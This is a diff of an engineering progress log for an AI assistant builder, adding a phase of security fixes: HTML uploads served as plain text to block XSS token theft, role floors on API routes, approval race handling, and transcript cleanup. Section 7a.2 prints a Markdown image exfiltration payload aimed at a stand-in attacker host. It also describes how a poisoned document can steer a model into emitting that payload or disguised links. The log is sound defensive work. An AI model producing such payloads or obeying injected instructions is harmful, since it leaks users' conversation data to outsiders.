@@ -7019,90 +7019,6 @@ longest status. Checked by measuring every text and bullet in the drawing
 against every other: the only overlaps left are the stop numbers inside
 their own circles.
 
-### Found on the way
-
-- **Turns outliving their test.** A turn now runs a moment past the
-  request that started it (its last writes). A test fixture waits for each
-  test's turns, and stops any still running, before the test's tables are
-  dropped; without it a turn from one test failed inside the next.
-- **The list's lamp went out when leaving.** Checked live: leaving a
-  conversation mid-answer ran the same "the stream ended" code as a
-  finished answer and turned its lamp off. Letting go on purpose is now
-  told apart from an ending.
-
-### Verified
-
-- **Live**, against a throwaway database with a 12-second stand-in model
-  and the Redis log: sent a message and reloaded 2 seconds in: the page
-  came back watching the answer, with Stop, and the run was saved as a
-  normal finished turn, not aborted. Sent another, opened a second
-  conversation (the first kept its lamp), came back through the lamp: the
-  answer so far was there and continuing. Pressed Stop on a turn being
-  watched after a reload: recorded as stopped after 6 seconds. The turns'
-  logs were in Redis and expired on their own.
-- **Tests:** `test_turns.py` (13): a turn carries on when nobody watches;
-  sending still streams the whole answer, with event ids; a page finds the
-  running turn and watches it from the start, and after the last event
-  seen (parameter and header); one turn per conversation and many
-  conversations at once; Stop and an approval with nobody watching; a turn
-  watched only through its own conversation and not by another org; a
-  shutdown; the memory fallback; an append that fails. `test_turns_redis.py`
-  (4, integration): writing, watching, ending and expiry; a lost turn;
-  the heartbeat; keys scoped to the conversation. Web: `sse.test.ts` (4).
-- **Mutation-tested:** 24 of 24, after one test was fixed: it had patched
-  the key builder wholesale, so a key without the conversation went
-  unnoticed.
-
-## 14. The landing page
-
-Asked for after QOS-01: a landing page that looks finished, with motion
-and more detail. It follows `docs/DESIGN.md` (the line diagram) rather
-than a generic product page: no cards, no gradients, no section-entry
-animations; one moment of motion, and that moment is the product's own
-picture.
-
-### What is on it
-
-`app/page.tsx` is a server component. Three small client components sit
-in it: the hero's diagram, `Reveal` (scroll-in) and `Countdown` (the
-approval still's clock).
-
-- **The hero.** The headline, one sentence on what the product does, and
-  the two actions. Under it, `components/landing/RouteHero.tsx`: a support
-  assistant drawn as the builder draws it. Input, Guardrails, Router, the
-  Agent, Output on the main line; a document feeding a knowledge base from
-  above; a database and a tool from below. Every name in it is a real one
-  from the product.
-- **Four steps** (Draw it, Try it, Measure it, Publish it), numbered
-  because they are a sequence.
-- **What an assistant can use**, in the three family colours.
-- **Oversight:** a drawn approval card and a drawn Run details strip.
-- **Self-hosting:** the compose commands, what the preflight prints, and
-  where the data, the model and search live.
-- **Start from a sample**, and the footer with the version.
-
-### The one moment of motion
-
-The diagram plays one message through, once, in about 6 seconds: the
-main line draws, the stops come in, a marker travels to the Agent, a
-marker dash runs down the knowledge base line and then the database line
-while the Agent's status line says what it is doing, the marker leaves for
-Output, and the answer appears with its citation and cost.
-
-It is CSS only. Each element carries its delay and duration as CSS
-variables (`--d`, `--dur`, set by `at()`), and the keyframes in
-`globals.css` (`route-draw`, `route-pop`, `route-pulse`, `route-token`,
-...) read them. "Play again" changes the SVG's `key`, so React mounts it
-afresh and every animation starts over; no timers to clear.
-
-**Reduced motion.** With `prefers-reduced-motion: reduce` the page opens
-on the finished picture, and the button reads "Play the message". Pressing
-it is asking for motion, so then it plays. That needed one change in the
-global rule: it zeroes every animation with `!important` inside
-`@layer base`, which no later rule can beat (a layered `!important`
-outranks an unlayered one). The rule now skips `.route-asked` and its
-descendants, the class the diagram gets once someone presses the button.
-
 ### On a phone
 
 Asked for next: the page fully usable on a phone, with signing in left to
@@ -7218,3 +7134,789 @@ usage rows change; cost and budgets were already right.
 - Integration (Postgres): `test_agent_caps_rag.py` (2 new: a chunk loaded
   by id with its source; never another assistant's).
 - Mutation: 7 of 7 caught.
+
+## 16. Phase 7a: security and platform fixes
+
+The first part of the internal rollout (`docs/INTERNAL_PLAN.md`): fixes to
+real issues in today's product, found by the gap review
+(`docs/research/gap-review.md`), before anything opens to employees.
+
+### 7a.1 Uploaded files never run as the app
+
+**The hole.** A knowledge file was stored in MinIO with whatever content
+type the browser sent, and a citation's "Open source" link served it with
+that type from the app's own address (Caddy passes `/assistant-uploads/*`
+to MinIO on the same origin). An HTML file is a supported upload, so a
+builder could upload one with a script in it. When an admin opened the
+citation, the script ran as the app and could read the sign-in tokens in
+local storage: one builder account turned into the owner's. The threat
+model had said no XSS existed, but it had only looked at Markdown.
+
+**Three walls now:**
+
+1. **At upload, the server decides what the file is**
+   (`storage/file_types.py`, `classify_upload`): a PDF by its `%PDF-`
+   signature, a Word file by its own structure (a zip holding
+   `word/document.xml`), otherwise text, where the file name only chooses
+   between HTML, Markdown and plain text. The browser's type is at most
+   that tie-break. Anything else is refused at once with "This file can't
+   be added. Use PDF, Word (.docx), HTML, Markdown or plain text.", instead
+   of failing later in indexing. The object is stored with the server's
+   type, which ingest still uses to pick the parser.
+2. **When a link is minted, the server decides how it is served**
+   (`serve_kind`, `content_disposition`): the type and disposition are
+   signed into the presigned URL (`ResponseContentType`,
+   `ResponseContentDisposition`), so MinIO answers with ours, not the
+   stored one. A PDF opens in the browser; a Word file downloads; every
+   text format, **HTML included, is shown as plain text**; anything a link
+   cannot vouch for downloads as opaque bytes. This never trusts the stored
+   type, so files uploaded before the fix are covered too.
+3. **At the proxy**, every response on the files path gets
+   `X-Content-Type-Options: nosniff` and a policy that forbids scripts,
+   forms and framing. Not `sandbox` or `object-src`: those stop the
+   browser's own PDF viewer, and PDFs are what people open from citations.
+
+**Left for later:** serving files from a separate host name (so they never
+share the app's origin at all) needs a second certificate on the private
+subdomain; it goes with the internal hosting setup in Phase 8.
+
+**Verified:**
+
+- Through real MinIO, fetching each link the way a browser follows a
+  citation (no auth header): an HTML upload comes back as `text/plain`
+  and inline; HTML bytes claiming to be a PDF under a PDF name are stored
+  and served as plain text; a Word file downloads with its name intact
+  (including non-ASCII characters); a PDF opens inline; a file stored the
+  old way (`text/html` on the object) is still served as plain text; an
+  executable is refused with `unsupported_file_type`.
+- `tests/test_file_types.py` (23): what each kind of upload is, that the
+  browser's claim only breaks ties between text formats, that no kind
+  can ever be served as an active type, and the disposition header.
+  `test_deploy.py`: the proxy's headers on the files path.
+- Mutation-tested: 12 of 12, after two tests were added for the two that
+  first survived (the stored object's own type, and an active serving type
+  that no link could reach).
+
+### 7a.2 Model output cannot send data out through images or links
+
+**The hole.** An answer is Markdown, and Markdown can hold an image:
+`![](https://evil.example/?d=...)`. The browser fetches an image the moment
+it renders, with no click. If a poisoned document or web page steers the
+model into writing one with something from the conversation in the address
+(a ticket's details, a table row the asker could read), that data leaves
+as soon as the answer appears. This is how EchoLeak and the Slack AI leak
+worked. Links are the slower version of the same thing: the model can label
+a link to anywhere "Refund policy", and the person clicks it.
+
+**Two walls for images, one signpost for links:**
+
+1. **Images in model output are never loaded.** `Markdown.tsx` renders an
+   image as a small note instead of an `<img>`: "Image not shown: alt
+   (host)". Nothing is silently hidden, and a strange host stands out.
+   This covers inline images, reference-style images (`![x][1]` with the
+   address defined elsewhere) and raw HTML `<img>` (which react-markdown
+   already shows as text).
+2. **The page's content policy** (`next.config.ts`) now has
+   `img-src 'self' data: blob:`. If a future renderer, or a library, ever
+   puts an `<img>` with another site's address on the page, the browser
+   refuses to fetch it.
+3. **A link to another site shows where it goes.** Beside the link text
+   comes its host in muted text, e.g. "Refund policy (evil.example)", and
+   hovering shows the full address. A link whose text is already its
+   address doesn't repeat it, and links within the app (relative paths,
+   `#anchors`) and citation chips are unchanged. `lib/safe-links.ts` holds
+   the rules (`externalHost`, `textShowsAddress`, `imageNote`). The host is
+   worked out without the page's origin, so the server render and the
+   browser render agree.
+
+**Left for later:** the web-search tool is another way out. A steered model
+can put data into a search query, which goes to the search provider. That
+needs a policy per assistant (block or warn on web search for assistants
+that read restricted data), which comes with the actions work in Phase 9
+(9.4).
+
+**Verified:**
+
+- In the dev app's chat, with the fake driver echoing an image, a labelled
+  link and a bare address: the page has no `<img>` at all, the browser's
+  resource list holds no request to the image's host, the image shows as
+  "Image not shown: chart (example.com)", the labelled link has
+  "(example.com)" after it, the bare address has nothing added, and the
+  page's policy header carries `img-src 'self' data: blob:`.
+- `lib/safe-links.test.ts` (6): which links count as external, the host of
+  each, when the text already shows the address, and the image note.
+- `components/chat/markdown-safety.test.ts` (7): the real `Markdown`
+  component rendered to HTML. No `<img>` and no trace of the secret in the
+  address appear for inline, reference-style or raw HTML images; an
+  external link shows its host once; citation chips are untouched;
+  `javascript:` links still never become live.
+- `security-headers.test.ts` (2): reads the real Next config, so a loosened
+  `img-src` fails the build.
+- Vitest now compiles JSX with the automatic runtime
+  (`vitest.config.ts`), so components can be render-tested without
+  importing React.
+- Mutation-tested: 10 of 10 (images rendered again, the host never or
+  always shown, the note dropping the host, every link treated as this
+  site, `mailto:` treated as external, the address check broken, the
+  image policy loosened or removed, `noreferrer` dropped).
+
+### 7a.3 Access is denied by default, and every route has a written rule
+
+**The hole.** Phase 8 adds an Employee role for people who only chat. But
+of the 79 routes that act inside an org, only 5 asked for a role. The rest
+checked that the caller belonged to the org (or had created the assistant
+or conversation). A new role ranked below `member` would have passed all
+74: drafts, run traces, evals, memories, the AI helpers, and `POST
+/assistants`, which makes its creator an editor, free to add databases and
+MCP servers at the company's cost. Hiding Studio pages in the web app
+wouldn't help, because the sign-in token in the browser can call the API
+directly.
+
+**One floor, applied where membership is found.** `app/security/access.py`
+holds `STUDIO_FLOOR` (the lowest role that may use the Studio, `member`
+today) and `member_of`, the one function that finds a caller's membership
+in an org: 404 if there is none, 403 `studio_access_required` if the role
+is below the floor. Every place that looked up a membership for access now
+goes through it:
+
+- the shared dependencies in `api/deps.py`: an org in the path, the
+  `X-Org-Id` header, an assistant, a conversation;
+- the eval-suite and eval-run context (`routes/evals.py`), which had its
+  own lookup;
+- the approval decision (`services/approvals.py`), which also had its own;
+- the MCP catalog and runner status, which needed only a signed-in user
+  and now need an org membership. The web app already sends the org header
+  on those calls.
+
+So the Employee role, when added, gets nothing until a route is written
+for it. Phase 8 will add separate chat dependencies for that.
+
+**A written rule for every route.** `tests/test_role_matrix.py` holds
+`ROLE_MATRIX`: all 93 published routes, each marked public, signed-in,
+member, editor (the assistant's creator or an admin), starter (whoever
+started the conversation, or an admin) or admin. The walk sets up one org
+with an owner, an admin, a member who built everything (the creator) and a
+member who didn't, and then:
+
+- fails on any route missing from the table, or listed but gone;
+- asks every route as every role the table refuses, and expects 403;
+- asks every route as every role the table allows. Reads must answer.
+  Writes are sent a body of the wrong shape: FastAPI runs the access
+  checks before it reads the body, so passing them shows up as 422 and
+  changes nothing. Writes with no body (deletes, stop, reindex) are not
+  sent as an allowed role, since they would delete the walk's own objects;
+  other test files cover them;
+- raises the floor to `admin`, so a plain member stands in for a role
+  below it, and expects `studio_access_required` from every org route,
+  while their own profile and org list still answer;
+- checks afterwards that nothing changed.
+
+**Left for later:** `POST /orgs` stays open to any signed-in person (it is
+how an org starts). When the Employee role arrives, org creation must be
+limited, along with the personal org made at registration (Phase 8). Admins
+could still post into other people's conversations here; 7a.4 (below)
+ends that.
+
+**Verified:**
+
+- `tests/test_role_matrix.py` (6): the table is complete, the floor locks
+  out no role that exists today, refusals and access match the table for
+  all four people, a role below the floor reaches no org route, and
+  nothing changed.
+- Mutation-tested: 11 of 11. Each of these was caught: the floor never
+  applied; the floor skipped in each place membership is found (org path,
+  `X-Org-Id`, assistant, conversation, eval suite, approval decision); the
+  MCP catalog back to any signed-in user; members allowed to change budgets
+  or edit any assistant; admin-only routes opened to members.
+- The 31 test files that touch access (tenant isolation, roles, approvals,
+  conversations, evals, MCP, budgets and others): 444 passed, 2 skipped
+  (the POSIX-only sandbox tests). Ruff, the format check and mypy pass.
+- In the dev app, the builder's MCP tab still lists the catalog: the web
+  app already sends the org header, and both calls answer 200.
+- `packages/shared/openapi.json` and the generated types were refreshed
+  (the two catalog routes now list the `X-Org-Id` header); the snapshot
+  test and both typechecks pass.
+
+### 7a.4 Admins read other people's conversations, but cannot act in them
+
+**The hole.** Any admin could post a message into anyone's conversation,
+stop its answer, rename it or archive it. Posting is the dangerous one: a
+message runs the agent *as the conversation's owner*, with their memory
+today and, once Phase 9 binds the asker's identity into tools, as them for
+"show my tickets" or "request access for me". An admin's message would act
+in an employee's name, and the same admin could then approve the write
+their own message caused. The plan (D5) lets admins *read* any
+conversation; reading is not a licence to act.
+
+**Now:**
+
+- `require_conversation_starter` (`api/deps.py`, renamed from
+  `require_conversation_editor`) lets only the person who started the
+  conversation post into it, stop it, rename it or archive it. Admins and
+  owners get 403 `not_conversation_owner` like everyone else. A
+  conversation whose starter's account is gone can be read, not changed.
+- Reading is unchanged: messages, runs, the live turn and pending
+  approvals still open for admins (and, until private conversations land
+  in 7b.2, for every member).
+- Approval decisions are unchanged: the starter or an admin. Plan D17
+  keeps today's in-chat approval until admin-approved actions have their
+  own executor; an admin can no longer cause the write they approve,
+  because they can no longer post.
+- Every conversation now says who started it (`created_by` in the API).
+  The chat page uses it (`components/chat/conversation-access.ts`,
+  `canAct`): someone else's conversation opens with no message box, Stop,
+  Rename or Archive, and a note in the composer's place, "Only the person
+  who started this conversation can reply in it." An answer being written
+  there can still be watched.
+
+**Verified:**
+
+- `test_rbac_escalation.py`: an admin and the owner can read a member's
+  conversation (detail, messages, runs, approvals, live turn) and get 403
+  on posting, stopping, renaming and archiving, with nothing changed
+  afterwards; only the creator can rename; the conversation reports who
+  started it.
+- `test_role_matrix.py`: the starter level is now the creator alone, and
+  approval decisions have their own level (starter or admin); the walk
+  holds for every route.
+- `conversation-access.test.ts` (4) and `conversation-list-access.test.ts`
+  (3): the rule, and the real conversation list rendered to HTML, with
+  Rename and Archive only on the user's own conversations.
+- In the dev app, signed in as an admin of another account's org: that
+  account's conversation opened with its messages and run details, no
+  message box, Send, Rename or Archive, and the note; a direct post from
+  the admin's session got 403 `not_conversation_owner` while the read got
+  200. The admin's own new conversation had all of them.
+- Mutation-tested: 8 of 8 (admins allowed again, any member allowed, the
+  starter not reported, approval decisions opened to members or taken from
+  admins, and three on the web side: everyone may act, a missing starter
+  counting as yours, the list ignoring the rule). The one that removes
+  admins from approval decisions is caught by `test_security_pass.py`.
+- The 33 access-related API test files with the OpenAPI snapshot: 455
+  passed, 2 skipped (the POSIX-only sandbox tests). Ruff, the format check
+  and mypy pass. Web: 239 tests, tsc and eslint pass; the shared types are
+  regenerated and compile.
+
+### 7a.5 The CLI's transcripts live on a volume, and leave with their conversation
+
+**The hole.** Every turn runs the Claude Code CLI, which writes the whole
+session to a JSONL transcript: the prompt, every tool call and its output
+(SQL rows included), the answer. The next turn *resumes* from that file.
+It went to the server user's home folder, which meant:
+
+- **Lost on every redeploy.** In the container that is the disposable
+  layer, so `up -d --build` wiped it. The conversation still named the old
+  session, and resuming a session that is gone failed on every turn from
+  then on. People keep helpdesk threads open for days, and we deploy often.
+- **Never deleted.** Not on archive, not even when the assistant was
+  deleted (only the empty working folder was). A conversation removed
+  from the app stayed on disk in full.
+- **In development, in the developer's own `~/.claude`.** One such
+  transcript turned up there, from an earlier test drive.
+
+**One known place.** `settings.agent_state_dir` (`AGENT_STATE_DIR`) holds
+both the per-conversation working folders (`scratch/<id>`, where they
+already were in development) and the CLI's config folder (`claude/`),
+handed to the CLI as `CLAUDE_CONFIG_DIR` (`agent/options.py`). The
+production image sets it to `/var/lib/assistant-studio`, owned by the app
+user, and both compose files mount one named volume, `agentstate`, there
+for the API and the worker. The worker needs it too: its evals run turns,
+and its sweep must see what the API's turns wrote. It is a cache, kept out
+of backups on purpose (OPERATIONS.md section 5): Postgres is the source of
+truth.
+
+Checked against the bundled CLI itself, not guessed:
+
+- it reads `CLAUDE_CONFIG_DIR`;
+- it names a transcript folder after the working directory, with every
+  non-alphanumeric character turned into `-`, and shortens names over 200
+  characters;
+- a session's subagent transcripts sit beside it, in `<session>/subagents/`.
+
+The working directory ends in the conversation id, so a conversation's
+transcripts are found by that suffix (`agent/cli_files.py`). The path must
+stay short, and a test checks the production one does.
+
+**Resume only what is there.** Before a turn resumes, `_session_to_resume`
+checks the transcript exists (`cli_files.has_transcript`). If it doesn't (a
+lost volume, or the CLI's own 30-day clean-up), it logs
+`session_missing_replayed` and returns nothing. The turn then takes the
+path a summary refresh already uses: it replays the stored summary and
+recent messages, and its new session replaces the old id. The fake driver
+keeps no files, so it is not checked. A session id that doesn't look like
+one is never used in a path.
+
+**Removed with their conversation.** `cli_files.discard` removes a
+conversation's working folder and every transcript of it:
+
+- on **archive**: an archived conversation can't be continued, and its
+  messages stay in the database for whoever may read them;
+- on **assistant delete**, where only the working folder went before.
+
+A daily worker job (`agent_files_sweep`, 03:30) removes:
+
+- everything of a conversation that is gone or archived;
+- for a live conversation, transcripts other than the session it would
+  resume, once they are a day old. A new session starts after each summary,
+  and on every message when history is off, and the old ones are never read
+  again. The day's grace protects a session a turn is writing right now.
+
+Folders without a conversation id are left alone.
+
+**Stopping cleanly.** A watched answer is an open stream, and uvicorn
+waited for every open connection before shutting down, so Docker's 10
+seconds ran out first and killed the process before it could record its
+running turns as stopped. Now uvicorn closes connections after 10 s
+(`--timeout-graceful-shutdown 10`), the app then marks its turns stopped,
+and compose gives the API and the worker 30 s (`stop_grace_period`).
+
+**Left for later:**
+
+- **The crash reaper is in 7a.7.** After a hard crash, pending approvals
+  are released and a question with no answer gets an "interrupted" reply.
+- **Deletion paths for erasure and retention** call `discard` when they are
+  built (10.3).
+- **Transcripts are unredacted while their conversation lives.** Anyone
+  who can read the volume can read them.
+
+**Verified:**
+
+- `tests/test_cli_files.py` (13):
+  - the CLI gets the config folder;
+  - the production path keeps the id in the folder name;
+  - a transcript is found only for its own conversation and session;
+  - odd session ids are never used as paths;
+  - a missing transcript is replayed, end to end through a real turn;
+  - the fake driver resumes as before;
+  - archive and assistant delete remove the files;
+  - `discard` removes one conversation's files and no one else's;
+  - the sweep keeps exactly what live conversations resume, including a
+    file being written;
+  - the worker job clears archived and unknown conversations;
+  - the job is scheduled.
+- `test_deploy.py`: both stacks mount the volume on the API and the worker;
+  the image sets the path and its owner; the shutdown limits are in place.
+- A fresh named volume over the image's folder is writable by the app
+  user, checked with a throwaway image on the same base.
+- Mutation-tested: 17 of 17, among them every removal path skipped, the
+  sweep deleting the current session or a file being written, archived
+  conversations kept, the job unscheduled, and the volume or the shutdown
+  limit dropped.
+
+### 7a.6 A maintained file store, pinned versions, and model aliases
+
+Three things that would have broken quietly, each found by the gap review
+and each now pinned down.
+
+**1. The file store.** `minio/minio` is gone from Docker Hub and MinIO's
+code is archived, so a fresh server could not be installed or restored from
+our own steps. The stack now uses Chainguard's build,
+`cgr.dev/chainguard/minio`, which is rebuilt from source daily and free to
+pull, pinned by digest in all three compose files.
+
+- **Safe against the known CVEs.** It runs `RELEASE.2026-09-22`, past the
+  fix for the two signature-bypass CVEs, which affect releases before
+  `2026-04-11`. Those CVEs write objects, and our proxy only ever passed GET
+  and HEAD to the store, so they were never reachable from outside anyway.
+- **Same tools inside.** The image carries `mc` and a shell, so the bucket
+  job and the backup scripts keep using the one image.
+- **A different user, handled automatically.** It runs as uid 65532, not
+  root, so a volume the old image wrote is root's. A one-off `minio-owner`
+  step hands the data folder over before the server starts. It does this
+  only when the folder isn't 65532's already, as root with only the
+  `CHOWN` capability and no network.
+- **Backups as the operator.** The scripts now run `mc` as the calling
+  user (with `HOME=/tmp`), because the image's own user can't write to an
+  operator's folder on Linux.
+
+Proved on the dev stack, whose volume the old image wrote:
+
+- the hand-over took the folder from uid 0 to 65532;
+- all 216 old objects are listed, and the oldest reads back byte for byte;
+- the real-MinIO upload tests pass (51), including the signed content-type
+  and disposition from 7a.1;
+- a backup and a verify both pass (restored into a scratch database,
+  vector index included); `demo` is untouched.
+
+**2. Pinned versions.** Every dependency floated (`>=`), with no lock, so
+each rebuild could pick up a new Claude CLI (carried by `claude-agent-sdk`)
+or a new `sqlglot`, the parser that decides whether a statement reads or
+writes. `apps/api/constraints.txt` now holds every version exactly:
+
+- It was made by installing the API in a clean `python:3.12-slim`
+  container under the versions tested in this venv, then freezing it.
+  Shared packages match development exactly, and Linux-only ones such as
+  `uvloop` are pinned too.
+- The image build and CI install under it, so CI tests and audits what
+  ships.
+- `claude-agent-sdk` and `sqlglot` are exact in `pyproject.toml` as well,
+  and a test checks both agree with the lock.
+- The file's header says how to bump a version on purpose.
+
+**3. Model aliases and the 5.5 models.** Approved versions stored dated ids,
+checked strictly on every turn. Haiku 4.5 can retire from 2026-10-15, so
+removing a retired id would have broken every assistant on it at once, and
+moving each one meant a new version and a new approval. Now
+(`agent/models.py`):
+
+- **Aliases.** An assistant names a family: `haiku`, `sonnet`, `opus` or
+  `fable`. Each runs as that family's current model. New assistants and
+  the shipped samples use aliases.
+- **Repointing.** The operator moves an alias with `MODEL_ALIASES`. The
+  preflight refuses an unknown alias or model id.
+- **Retired ids keep working.** A pinned id stays valid when its model
+  retires (`RETIRED_MODELS`) and runs as its replacement. The preflight
+  warns about saved versions on a deprecated or retired model.
+- **Nothing sends an alias.** `resolve_model` turns every name into a
+  pinned id before it reaches the CLI or the API: the main model,
+  subagents, the fallback, the router, the judge, titles, summaries and
+  contextual retrieval. The SDK accepts "sonnet" too, but the CLI would
+  then choose the model itself. Run details, messages and the usage ledger
+  record the model that ran.
+- **The 5.5 models.** Sonnet 5.5, Opus 5.5 and Fable 5.1 are added at
+  their published prices. Defaults: main `sonnet` (Sonnet 5.5, the same
+  price as Sonnet 5), judge `opus` (Opus 5.5, cheaper than Opus 5); the
+  router, subagents and internals stay on `haiku`.
+- **Thinking.** Opus 5.5 and Fable 5.1 refuse `thinking: disabled` with a
+  400. A turn with either, as the main model or a subagent, asks for
+  adaptive thinking instead.
+- **Fallback.** Opus 5.5 also takes the AI helpers' server-side refusal
+  fallback.
+
+**The real-model check (approved, about $0.02 in all) found three things
+the fake driver never could:**
+
+1. **The CLI wasn't using the platform's key in development.** Settings
+   read the key from `.env` without exporting it, so the CLI subprocess
+   fell back to the developer's own Claude login in `~/.claude`: another
+   account and another bill. Once 7a.5 gave the CLI its own config folder,
+   it said "Not logged in". The key is now handed to the CLI explicitly
+   (`agent/options.py`). Production already passed it through its
+   environment.
+2. **The bundled CLI was too old for Opus 5.5.** The API answered
+   "Claude Code 2.1.258 does not support this model; version 2.1.280 or
+   newer is required". With the refusal fallback on, Opus 5.5 assistants
+   silently answered with Sonnet 5.5; with it off, people saw "Something
+   went wrong. Try again".
+   - `claude-agent-sdk` is now 0.2.164 (CLI 2.1.292), approved; its own
+     dependencies were already the locked versions.
+   - That failure now reads as `model_unsupported` and says an
+     administrator must update the platform, without offering a retry
+     that can't help.
+3. **The CLI prices models it doesn't know at Opus 5's $5 / $25.** That
+   recorded Sonnet 5.5 at 2.5 times its price, and would have recorded
+   Fable 5.1 at half of its price, so budgets would overspend. The ledger
+   now settles each turn at our own prices, from the CLI's per-model token
+   counts (`modelUsage`): input, 5-minute cache writes, cache reads at each
+   model's rate (0.05x on Opus 5.5, 0.025x on Fable 5.1, 0.1x otherwise),
+   output and web searches. A model we have no price for keeps the CLI's
+   figure.
+
+After the fixes, on the real API:
+
+- Sonnet 5.5 and Opus 5.5 each answered two messages.
+- The second message of each resumed the CLI session.
+- Opus 5.5 with thinking set to disabled ran adaptive, with no error and no
+  fallback.
+- Recorded costs matched the published prices exactly (506 in and 5 out on
+  Opus 5.5: $0.002124).
+- Archiving removed both transcripts.
+
+**Left for later:**
+
+- **No admin screen for models yet.** Moving an alias is an operator
+  setting, and re-running each assistant's evals after a move is up to
+  whoever moves it.
+- **No preflight check on image pins.** The preflight runs inside the API
+  container and can't see compose image tags, so the digest pin is held by
+  the deploy test instead.
+
+**Verified:**
+
+- Tests:
+  - `tests/test_model_aliases.py` (20): aliases, repointing, retired ids,
+    refusals, defaults, pinned ids only to the CLI and subagents,
+    fallbacks, thinking, the builder's list, both preflight checks, the
+    recorded model, and per-model pricing (including cache, web search,
+    subagents on another model and an unknown model);
+  - `test_deploy.py`: the digest pin, one image, the owner step, backups
+    as the operator, the image and CI installing the lock, and the exact
+    pins agreeing with it;
+  - `test_agent_resilience.py`: the too-old-runtime failure;
+  - `test_security_pass.py`: the key handed to the CLI.
+- Eleven existing tests expected the old dated defaults and were updated
+  to the aliases (and to Opus 5.5's prices for the judge).
+- Mutation-tested: 30 of 30 across the three parts.
+
+### 7a.7 Approvals that tell the truth, and recovery after a crash
+
+**The holes.**
+
+- **A false "approved".** `resolve` read the approval, saw "pending", then
+  wrote the decision. When the turn's wait timed out, the turn treated it
+  as declined and nothing ran, but before it marked the row expired, a
+  click could still land and record "approved". The audit trail then said
+  an admin approved an action that never happened. Two clicks at once
+  could also both pass the check.
+- **Pending forever.** A process killed mid-wait (an OOM kill, a restart
+  past its grace period) left its approval "pending" for good. Nothing
+  closed it, and it kept being offered as if it could still be decided.
+- **No answer, no explanation.** The question that turn was answering
+  never got a reply, so the person waited on a conversation that would
+  never move.
+
+**Deciding is one conditional update** (`services/approvals.resolve`). The
+row changes only if it is still pending and not past its expiry, and the
+audit entry (`approval.approved` or `approval.denied`, with who and from
+where) is written in the same transaction, so there is an entry exactly
+when a decision was recorded. Otherwise the reply is `approval_not_pending`
+(already decided) or the new `approval_expired`; the approval card treats
+both as closed.
+
+**Closing is conditional too, and the turn follows the row.** When a wait
+ends without an answer (a timeout, Stop, or the turn vanishing),
+`approvals.close` moves a still-pending row to `expired` and never
+overwrites a decision. It returns what the row now says, and the turn acts
+on that:
+
+- **Approved just as the wait timed out:** the person said yes before the
+  expiry, and only the wake-up lost the race. The action runs, and the row
+  says approved; both are true.
+- **Denied just as the wait timed out:** a denial.
+- **Stopped at the moment it was approved** (or the turn vanished): Stop
+  wins. The row becomes the new status `cancelled`, "approved, but the
+  answer had stopped: nothing ran", which run details now say in those
+  words.
+
+An approval past its expiry is no longer offered: the conversation's
+pending list and the `/metrics` pending gauge both leave it out, even before
+anything closes it.
+
+**After a crash** (`services/recovery.py`, run by the worker every minute,
+and at once when the worker starts):
+
+- **Orphaned approvals close.** Approvals still pending more than a minute
+  past their expiry become `expired`, each with an audit entry by the
+  system (`reason: orphaned`). The waiting turn closes its own at expiry,
+  so anything older belongs to a process that died.
+- **Unanswered questions get a notice.** A question that is the last
+  message of its conversation, over two minutes old, with no turn alive
+  for it anywhere, gets a system reply: "This message wasn't answered: the
+  server stopped while it was being answered. Send it again."
+  - "Alive anywhere" is the shared turn log in Redis, refreshed every 10
+    seconds by a running turn and gone 30 seconds after it dies
+    (`turns.live_anywhere`).
+  - When that can't be read (no shared log, or Redis down), nothing is
+    said: a turn in another process may still be answering.
+  - Archived conversations and eval runs are left alone.
+
+**Verified:**
+
+- `tests/test_approval_races.py` (15):
+  - two opposite decisions at once record exactly one, with one audit
+    entry;
+  - a decision after the expiry is refused and changes nothing, also
+    through the endpoint;
+  - closing never overwrites a decision;
+  - an expired row isn't offered and isn't counted as pending;
+  - all four races at the turn (approved or denied as the wait times out,
+    approved as Stop lands, approved as the turn vanishes) and the plain
+    timeout;
+  - the sweep closes only orphans, with the system audit entry;
+  - the notice goes only to a dropped question, once, and never when
+    running turns can't be seen or the conversation is archived;
+  - the job runs every minute from the start.
+- `run-trace.test.ts`: the wording for `cancelled`.
+- `alembic check` against Postgres: no change needed. The status column is
+  plain text, so `cancelled` needs no migration.
+- Mutation-tested: 19 of 19.
+
+**Found while testing:** the new tests replaced the approval wait with a
+stub that didn't release its slot the way the real one does, and the
+registry test that counts open slots then failed when it happened to run
+afterwards. The stub now releases it. Separately, the dev datastores had
+stopped overnight, which made two Stop tests fail for want of Redis; with
+them running, everything passes.
+
+### 7a.8 Phones stay signed in, and logs are kept for half a year
+
+**Signed out by a bad connection.** Four things combined against anyone on
+a phone or a VPN:
+
+1. The web app treated every failure to load the signed-in user (no
+   network, a 429, a 5xx) as "signed out", and cleared the tokens.
+2. The refresher folded every failure into "no".
+3. On a weak link a refresh can succeed on the server while its reply is
+   lost. The phone then tries again with the token it still holds, and
+   reuse detection read that as theft and revoked the whole session.
+4. Refreshes shared the per-IP sign-in bucket (20 a minute), which
+   everyone behind one VPN or office address shares too.
+
+**Now, in the web app** (`lib/session.ts`, `lib/auth.tsx`, the app layout):
+
+- **Three outcomes.** A refresh is `ok`, `rejected` (the server said
+  401) or `unavailable` (no network, 429, 5xx).
+- **"Offline" is not "signed out".** When a refresh is unavailable, a
+  request fails with `offline` instead of handing back the 401
+  (`createAuthedFetch`).
+- **Only a 401 ends the session** (`endsSession`), meaning the server
+  refused it even after a refresh. Anything else keeps the person signed
+  in: "Can't reach the server right now. You're still signed in, and this
+  page tries again by itself."
+- **Retries back off.** They come at 2 s, 4 s, 8 s and so on, at most 30 s
+  apart, and at once when the phone comes back online or to the tab.
+  With the workspace already open, a thin banner says the same.
+
+**On the server** (`services/auth.py`, `routes/auth.py`):
+
+- **A lost reply is a retry, not theft.** A refresh token presented again
+  within 30 s of its use (`REFRESH_REUSE_GRACE_S`) is treated as a retry
+  when its session isn't revoked and nothing newer in that session has
+  been used. The pair from the lost reply is revoked (it never reached
+  anyone) and the caller gets a fresh one in the same session. Anything
+  else is still reuse, and the whole session is revoked: outside the
+  window, a session that moved on, a signed-out one, or a retired pair
+  presented later.
+- **Limits per session.** Refreshes are limited per session
+  (`RATE_LIMIT_REFRESH`, 10 a minute), keyed on the token's verified
+  family, with a generous per-address ceiling (`RATE_LIMIT_REFRESH_IP`,
+  600). They no longer touch the sign-in bucket. A 429 comes with
+  `Retry-After`, and the app reads it as "try later".
+
+**Logs that last.** The containers' own logs are capped at 50 MB and gone
+when a container is recreated: days, against the 180 days CERT-In asks
+for. Now:
+
+- **The proxy keeps an access log** (`deploy/proxy/Caddyfile`). It is JSON,
+  on its own volume (`caddylogs`), rolled at 100 MB and kept 4392 hours
